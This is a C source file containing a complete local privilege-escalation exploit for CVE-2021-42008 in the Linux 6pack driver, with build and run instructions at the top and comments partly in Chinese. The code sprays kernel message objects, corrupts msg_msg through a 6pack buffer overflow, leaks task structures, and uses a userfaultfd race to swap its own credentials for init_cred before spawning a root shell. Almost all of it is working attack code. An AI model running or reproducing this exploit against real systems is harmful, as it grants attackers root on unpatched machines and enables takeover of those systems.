// Exploit is designed and tested for Debian 11, kernel 5.10.0-8-amd64
// gcc -o exploit 6pack_exploit.c -s -lpthread
// while true; do ./cve-2021-42008 && break; done
#define _GNU_SOURCE

#include <endian.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/mman.h>
#include <unistd.h>
#include <poll.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <sys/shm.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sched.h>
#include <stdbool.h>
#include <assert.h>

//#define DEBUG 1
#ifdef DEBUG
#define debug_printf(...) printf(__VA_ARGS__)
#else
#define debug_printf(...) do {} while (0)
#endif

#define N_6PACK 7
#define PAGE_SIZE 0x1000
#define LEAK_PAYLOAD_SIZE 576
#define WRITE_PAYLOAD_SIZE 592
#define N_THREADS 8
#define N_MSG 0x100
#define RECV_MSG_LEN 0x1300
#define N_SP 0x100
// ffff0000096f2180 D init_task
#define INIT_TASK_TASKS 0xffff0000096e24e0
#define INIT_TASK_CREDS 0xffff0000096e2778
#define INIT_CRED       0xffff0000096ee0d8

static int qid_A[N_MSG]     = {0};
static int qid_B[N_MSG]     = {0};
static int ptmx_A[N_MSG]     = {0};
static int pts_A[N_MSG]     = {0};


uint64_t target_addr;
uint64_t race_page;
uint64_t init_cred = INIT_CRED;
pthread_t thread;

uint8_t buff[PAGE_SIZE]  = {0};


int valid_qid = -1;
int ptmx, pts;


typedef struct 
{
        long mtype;
        char mtext[1];
}msg;

void __pause(char *msg)
{
    printf("[-] Paused - %s\n", msg);
    getchar();
}

void errExit(char* msg1)
{
    puts(msg1);
    exit(-1);
}

void hexdump(uint8_t *buff, size_t size)
{
    int i,j;
    for (i = 0; i < size/8; i++)
    {
        if ((i % 2) == 0)
        {
            if (i != 0)
                printf("  \n");
            printf("  %04x  ", i*8);
        }
        printf("0x%016lx", ((uint64_t *)(buff))[i]);
        printf("    ");
    }
    putchar('\n');
}

void print_affinity()
{
    cpu_set_t mask;
    long ncpu, i;

    if (sched_getaffinity(getpid(), sizeof(cpu_set_t), &mask) < 0)
    {
        perror("[X] sched_getaffinity()");
        exit(1);
    }

    ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    puts("[*] CPU affinity:");

    for (i = 0; i < ncpu; i++)
        printf(" └ Core #%ld = %d\n", i, CPU_ISSET(i, &mask));
}

void assign_to_core(int core_id)
{
    /*
    if (unshare(CLONE_NEWUSER) < 0) {
        perror("[-] unshare(CLONE_NEWUSER)");
        return -1;
    }
    if (unshare(CLONE_NEWNET) < 0) {
        perror("[-] unshare(CLONE_NEWNET)");
        return -1;
    }*/
    cpu_set_t mask;
    pid_t pid;
    pid = getpid();

    printf("[*] Assigning process %d to core %d\n", pid, core_id);

    CPU_ZERO(&mask);
    CPU_SET(core_id, &mask);
    if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
    {
        perror("[X] sched_setaffinity()");
        exit(1);
    }
    print_affinity();
}


void alloc_msg_queue_A(int id)
{
    if ((qid_A[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("[X] msgget");
        exit(1);
    }
}
// spray 6 msg_msg in kmalloc-4k and 6 msg_msgseg in kmalloc-32
void send_msg(int qid, int size, int type, int c)
{
    struct msgbuf
    {
        long mtype;
        char mtext[size];
    } msg;

    msg.mtype = type;
    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &msg, sizeof(msg.mtext), 0) == -1)
    {
        perror("[X] msgsnd");
        exit(1);
    }
}

void *recv_msg(int qid, size_t size, int type)
{
    void *memdump = malloc(size);

    if (msgrcv(qid, memdump, size, type, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) < 0)
    {
        perror("[X] msgrcv");
        return NULL;
    }

    return memdump;
}

int open_ptmx(void)
{
    int ptmx;
    ptmx = getpt();

    if (ptmx < 0)
    {
        perror("[X] open_ptmx()");
        exit(1);
    }

    grantpt(ptmx);
    unlockpt(ptmx);

    return ptmx;
}

int open_pts(int fd)
{
    int pts;
    pts = open(ptsname(fd), 0, 0);

    if (pts < 0)
    {
        perror("[X] open_pts()");
        exit(1);
    }

    return pts;
}

void set_line_discipline(int fd, int ldisc)
{
    if (ioctl(fd, TIOCSETD, &ldisc) < 0)
    {
        perror("[X] ioctl() TIOCSETD");
        exit(1);
    }
}

uint8_t *sixpack_encode(uint8_t *src)
{
    uint8_t *dest = (uint8_t *)calloc(1, 0x3000);
    uint32_t raw_count = 2;

    for (int count = 0; count <= PAGE_SIZE; count++)
    {
        if ((count % 3) == 0)
        {
            dest[raw_count++] = (src[count] & 0x3f);
            dest[raw_count] = ((src[count] >> 2) & 0x30);
        }
        else if ((count % 3) == 1)
        {
            dest[raw_count++] |= (src[count] & 0x0f);
            dest[raw_count] =	((src[count] >> 2) & 0x3c);
        }
        else
        {
            dest[raw_count++] |= (src[count] & 0x03);
            dest[raw_count++] = (src[count] >> 2);
        }
    }

    return dest;
}
// generate_payload() —— construct payload and encode it
uint8_t *generate_payload(uint64_t target)
{
    uint8_t *encoded;
    memset(buff, 0, PAGE_SIZE);

    // sp->rx_count_cooked = 0x696
    buff[0x194] = 0x90;
    buff[0x19a] = 0x06;

    // fix upper two bytes of msg_msg.m_list.prev
    buff[0x19b] = 0xff;
    buff[0x19c] = 0xff;

    // // msg_msg.m_ts = 0x1100      0x19c + 0x8(long m_type) + 2 = 0x1a6
    buff[0x1a6] = 0x13;

    // msg_msg.next = target
    if (target)
    {
        for (int i = 0; i < sizeof(uint64_t); i++)
            buff[0x1ad + i] = (target >> (8 * i)) & 0xff;
    }

    encoded = sixpack_encode(buff);

    // sp->status = 0x18 (to reach decode_data())
    encoded[0] = 0x88;
    encoded[1] = 0x98;

    return encoded;
}


void alloc_msg_queue_B(int id)
{
    if ((qid_B[id] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
    {
        perror("[X] msgget");
        exit(1);
    }
}

void close_queue(int qid)
{
    if (msgctl(qid, IPC_RMID, NULL) < 0)
    {
        perror("[X] msgctl()");
        exit(1);
    }
}

void* handler(void *arg)
{
    uint8_t *payload;
    uint64_t *cred_val;
    struct uffd_msg msg1;
    unsigned long uffd = (unsigned long)arg;
    puts("[+] handler created");

    struct pollfd pollfd;
    int nready;
    pollfd.fd      = uffd;
    pollfd.events  = POLLIN;
    nready = poll(&pollfd, 1, -1);
    if (nready != 1)  // 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
        errExit("[-] Wrong pool return value");
    printf("[+] Trigger! I'm going to hang\n");

    if (read(uffd, &msg1, sizeof(msg1)) != sizeof(msg1)) // 从uffd读取msg结构，虽然没用
        errExit("[-] Error in reading uffd_msg");
    assert(msg1.event == UFFD_EVENT_PAGEFAULT);
    printf("[+] fault page handler finished\n");
    // 1. change msg_msg->m_ts and msg_msg->next,      msg_msg->next = &task_struct->real_cred - 0x8
    payload = generate_payload(target_addr);
    write(ptmx, payload, WRITE_PAYLOAD_SIZE);
    sleep(1);  
    printf("[+] ptmx %d, overwrite msg_msg next to %#lx finished\n", ptmx, target_addr);

    // 2. put &init_cred on fault page
    struct uffdio_copy uc;
    char buffer[0x2000];   // 预先设置好buffer内容，往缺页处进行拷贝
    memset(buffer, 0x43, sizeof(buffer));
    memcpy((void *)(buffer + 0x1000 - 0x30), (void *)&init_cred, 8);              // msg_msg: 0xfd0  -  real_cred
    memcpy((void *)(buffer + 0x1000 - 0x30 + 8), (void *)&init_cred, 8);          // msg_msg: 0xfd8  -  cred
    cred_val = (uint64_t *)(buffer + 0x1000 - 0x30);
    printf("[+] prepare buffer buffer[0xfd0] buffer[0xfd8] %#lx finished\n", *cred_val);

    uc.src = (unsigned long)buffer;
    uc.dst = (unsigned long)race_page; // (unsigned long) msg1.arg.pagefault.address & ~(page_size - 1);
    uc.len = 0x1000;
    uc.mode = 0;
    uc.copy = 0;
    ioctl(uffd, UFFDIO_COPY, &uc); // 恢复执行copy_from_user
    
    return 0;
}

void register_userfault(uint64_t fault_page, uint64_t fault_page_len, pthread_t thr)
{
    struct uffdio_api ua;
    struct uffdio_register ur;
    // pthread_t thr;

    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // create the user fault fd
    ua.api = UFFD_API;
    ua.features = 0;
    if (ioctl(uffd, UFFDIO_API, &ua) == -1)
        errExit("[-] ioctl-UFFDIO_API");
    //if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used for user fault
    //  errExit("[-] mmap fault page");
    ur.range.start = (unsigned long)fault_page;
    ur.range.len   = fault_page_len;
    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &ur) == -1)
        errExit("[-] ioctl-UFFDIO_REGISTER");  //注册页地址与错误处理fd，这样只要copy_from_user
                            //访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
    int s = pthread_create(&thr, NULL, handler, (void*)uffd); // handler函数进行访存错误处理
    if (s!=0)
        errExit("[-] pthread_create");
    return;
}

int main()
{
    uint8_t *payload;
    int status = 0;
    char *mesg;
    int64_t prev, curr;
    int64_t real_cred, cred;
    char comm[16];
    static int page_size;

    assign_to_core(0);
  
// 1-2. spray 6 msg_msg in kmalloc-4k and 6 msg_msgseg in kmalloc-32
    puts("[*] Spraying messages in kmalloc-4k...");
    for (int i = 0; i < N_MSG; i++)
        alloc_msg_queue_A(i);

    // payload = generate_payload(INIT_TASK_TASKS - 0x8);
    // payload = generate_payload(INIT_TASK_CREDS - 0x8);
    
    for (int i = 0; i < N_MSG; i++){
        send_msg(qid_A[i], 0xfd0+0x18, 1, 'A');
        if(i % 2){
            mesg = (char *)recv_msg(qid_A[i], RECV_MSG_LEN, 0);
            if((mesg[0x10] & 0xff) != 'A'){
                printf("recv_msg ---------- i %#x mesg[0] %#x mesg[0x10] %#x\n", i, mesg[0], mesg[0x10]);
                ptmx = ptmx_A[(mesg[0x10] & 0xff)];
                valid_qid = i;
            }
        }
        ptmx_A[i] = open_ptmx();
        pts_A[i] = open_pts(ptmx_A[i]);

        set_line_discipline(pts_A[i], N_6PACK);

    }

    if(valid_qid != -1){
        prev = INIT_TASK_TASKS;
        while(memcmp(comm, "cve-2021-42008", 14))
        {
            curr = prev - 0x360;
            payload = generate_payload(prev - 0x8);
            write(ptmx, payload, WRITE_PAYLOAD_SIZE);
            sleep(1);  
            mesg = (char *)recv_msg(qid_A[valid_qid], RECV_MSG_LEN, 0);
            memcpy((void *)&prev, (void *)(mesg + 0xfe0), 8);       
            memcpy(comm, (void *)(mesg + 0x1280), 16);
            printf("---- prev %#lx, comm %s ----- \n", prev, comm);
        }
        close_queue(qid_A[valid_qid]);
        if ((qid_A[valid_qid] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
        {
            perror("[X] msgget");
            exit(1);
        }
        page_size = sysconf(_SC_PAGE_SIZE);

        printf("[+] ptmx %d, found current task struct: 0x%lx, page_size %#x\n", ptmx, curr, page_size);

        msg *rooter;
        void *evil_page = mmap(NULL, 4*page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        // memset(evil_page, 0x45, 0x2000);
        race_page = (uint64_t)(evil_page + 0x1000);
        rooter = (msg *)(race_page - 0x8);          // cause fault page at race_page
        rooter->mtype = 1;
        printf("[+] &race_page = %#lx\n", race_page);

        
        target_addr = curr + 0x5f8 - 0x8;           // 1 null qword beforehand to avoid crash
        register_userfault(race_page, 0x1000, thread);
        
        msgsnd(qid_A[valid_qid], rooter, 0xfd0 + 0x10, 0);        // memory layout:   0xfd0 + 0x10  ->  kmalloc-4096 + kmalloc-32
        pthread_join(thread, NULL);
        sleep(2);
        printf("uid: %d\n", getuid());
        system("/bin/sh");
        munmap(evil_page, page_size*4);
    }
   
     
    

end:
    puts("[*] Cleaning up... ");

    for (int i = 0; i < N_MSG; i++)
    {
        if (i == valid_qid)
            continue;

        close_queue(qid_A[i]);
    }

    for (int i = 0; i < N_SP; i++){
        close(ptmx_A[i]);
        close(pts_A[i]);
    }
    return 0;
}

/*
(1) 查看结构 sixpack->cooked_buf 距离下一个chunk的距离
(1-1) 原环境
net_device size: 0x940  0x800
sixpack size: 0x270    0x268
sixpack->cooked_buf offset: 0x1000 - 0x940 - (0x696-8-6) = 0x38

sixpack->cooked_buf to msg_msg->m_list->prev: 0x696  0x7d6
msg_msg->m_list->prev 后两字节: 8+6

(1-2) 新环境
$ print sizeof(struct net_device)
$ p/x &(*(struct sixpack*)0)->cooked_buf


*/
